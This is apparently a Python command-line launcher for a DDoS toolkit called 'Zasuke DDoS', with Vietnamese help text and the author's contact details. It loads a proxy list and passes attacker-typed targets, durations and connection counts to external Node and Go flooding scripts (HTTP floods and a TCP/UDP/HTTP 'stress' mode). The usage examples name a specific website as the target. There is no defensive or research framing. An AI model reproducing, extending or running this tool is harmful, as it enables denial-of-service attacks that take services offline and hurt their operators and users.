from colorama import Fore, Back, Style
import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(Fore.BLUE + """ ███████╗ █████╗ ███████╗██╗   ██╗██╗  ██╗███████╗
╚══███╔╝██╔══██╗██╔════╝██║   ██║██║ ██╔╝██╔════╝
  ███╔╝ ███████║███████╗██║   ██║█████╔╝ █████╗  
 ███╔╝  ██╔══██║╚════██║██║   ██║██╔═██╗ ██╔══╝  
███████╗██║  ██║███████║╚██████╔╝██║  ██╗███████╗
╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
                                                 """)
    time.sleep(1.8)
    clear()

def si():
    print("Zalo/Call: 0853564916")
    print("Liên hệ: https://www.facebook.com/profile.php?id=100065020447686")

def menu():
    sys.stdout.write(f"Zasuke Ddos Update V1")
    clear()
    print(' Zasuke DDoS By Van Hoang ')
    print("https://www.facebook.com/profile.php?id=100065020447686")
    print(Fore.YELLOW + """
███████╗ █████╗ ███████╗██╗   ██╗██╗  ██╗███████╗
╚══███╔╝██╔══██╗██╔════╝██║   ██║██║ ██╔╝██╔════╝
  ███╔╝ ███████║███████╗██║   ██║█████╔╝ █████╗  
 ███╔╝  ██╔══██║╚════██║██║   ██║██╔═██╗ ██╔══╝  
███████╗██║  ██║███████║╚██████╔╝██║  ██╗███████╗
╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝

""")

def main():
    menu()
    while(True):
        cnc = input('''Input :''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            ()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            ()
        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            ()
        elif cnc == "special" or cnc == "SPECIAL" or cnc == "specialS" or cnc == "SPECIALS":
            ()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            ()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            ()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            ()
        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
            ()

        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node HTTP-SOCKET {url} {per} {time}')
            except IndexError:
                print(Fore.RED +'Cách sài: http-socket <url> <per> <time>')
                print(Fore.RED +'Ví Dụ: http-socket http://buithanhtrung.info/ 5000 60')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print(Fore.RED +'Cách sài: http-raw <url> <time>')
                print(Fore.RED +'Ví Dụ: http-raw http://buithanhtrung.info/ 60')

        elif "http-requests" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-REQUESTS {url} {time}')
            except IndexError:
                print(Fore.RED +'Cách sài: http-requests <url> <time>')
                print(Fore.RED +'Ví Dụ: http-requests http://buithanhtrung.info/ 60')

        elif "stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print(Fore.RED +'Cách sài: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print(Fore.RED +'Chế độ: [1] TCP')
                print(Fore.RED +'      [2] UDP')
                print(Fore.RED +'      [3] HTTP')
                print(Fore.RED +'Ví Dụ: stress 1.1.1.1 80/443 3 1250 60 5')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print(Fore.RED +'Cách sài: http-rand <url> <time>')
                print(Fore.RED +'Ví Dụ: http-rand http://buithanhtrung.info/ 60')

        elif "sever" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run sever.go -site {url} -data {method}')
            except IndexError:
                print(Fore.RED +'Cách sài: sever <url> METHODS<GET/POST>')
                print(Fore.RED +'Ví Dụ: sever http://buithanhtrung.info/ GET')

        elif "info" in cnc:
            print(f'''
[https://buithanhtrung.info]

            ''')
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] không đúng!")
            except IndexError:
                pass
main()